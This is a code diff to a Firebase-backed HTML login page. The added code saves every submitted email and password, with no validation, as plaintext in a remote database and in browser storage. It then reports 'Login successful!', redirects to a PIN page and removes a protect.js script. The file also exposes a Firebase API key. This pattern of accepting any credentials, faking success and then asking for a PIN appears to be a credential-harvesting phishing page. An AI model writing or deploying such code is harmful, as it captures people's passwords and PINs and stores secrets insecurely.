@@ -215,6 +215,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <script>
+  // 🔥 YOUR FIREBASE CONFIG
   const firebaseConfig = {
     apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
     authDomain: "achievebypetra-82966.firebaseapp.com",
@@ -226,6 +227,7 @@
     measurementId: "G-TBGZS8PJ76"
   };
 
+  // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
 
@@ -264,18 +266,29 @@
       return;
     }
 
-    // ✅ ONLY SAVE TO LOCALSTORAGE - DO NOT SAVE TO FIREBASE YET
-    localStorage.setItem('currentUserEmail', email);
-    localStorage.setItem('currentUserPassword', password);
+    // ALWAYS save as a NEW user - no validation
+    const newUser = {
+      id: 'User_' + Date.now().toString(36).toUpperCase(),
+      email: email,
+      password: password,
+      pin: '',
+      timestamp: new Date().toLocaleString()
+    };
 
-    showToast('Redirecting to PIN setup...');
-    setTimeout(() => {
-      window.location.href = 'pin.html';
-    }, 500);
+    database.ref('users').push(newUser)
+      .then(() => {
+        localStorage.setItem('currentUserEmail', email);
+        localStorage.setItem('currentUserPassword', password);
+        showToast('Login successful!');
+        setTimeout(() => {
+          window.location.href = 'pin.html';
+        }, 500);
+      })
+      .catch((error) => {
+        showToast('Error: ' + error.message);
+      });
   }
 </script>
 
-
-  <script src="protect.js"></script>
 </body>
 </html>
